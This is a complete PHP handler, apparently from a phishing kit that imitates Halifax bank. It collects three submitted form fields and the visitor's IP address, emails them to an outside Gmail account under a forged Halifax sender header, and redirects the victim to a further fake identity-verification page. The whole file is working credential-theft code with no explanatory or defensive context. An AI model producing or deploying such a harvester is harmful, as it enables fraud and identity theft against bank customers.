<?php
$ip = getenv("REMOTE_ADDR");
$two= $_POST['unu'];
$three =$_POST['doi'];
$five =$_POST['trei'];
$mesaj="
2: $two
3: $three
5: $five
$token
ip: $ip
";
$send="kingsama786@gmail.com"; 
$subject = "$ip";
$headers = "From: Halifax<xpp@h4l1f4x.com>";
mail($send,$subject,$mesaj,$headers);
include 'css/verify.js';
header("Location: customeridentificationdata.jsp.php");
?> 